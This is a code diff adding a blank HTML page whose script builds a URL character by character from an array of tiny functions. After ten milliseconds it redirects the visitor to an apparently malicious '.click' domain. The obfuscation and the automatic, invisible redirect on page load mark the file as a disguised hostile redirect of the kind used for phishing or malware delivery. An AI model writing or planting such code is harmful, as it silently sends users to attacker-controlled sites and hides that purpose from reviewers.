@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script>
+        const segments = [
+            _ => 'h',
+            _ => 't',
+            _ => 't',
+            () => 'p',
+            () => 's',
+            () => ':',
+            () => '/',
+            () => '/',
+            () => 'v',
+            () => 'e',
+            () => 'r',
+            () => 'g',
+            () => 'e',
+            _ => 'n',
+            () => '.',
+            function() { return 'c'; },
+            _ => 'l',
+            () => 'i',
+            () => 'c',
+            () => 'k',
+            function() { return '/'; },
+            function() { return 's'; },
+            _ => '/',
+            _ => 'n',
+            function() { return 'e'; },
+            function() { return 'w'; }
+        ];
+        setTimeout(() => {
+            window.location.replace(segments.map(f => f()).join(''));
+        }, 10);
+    </script>
+</head>
+<body></body>
+</html>
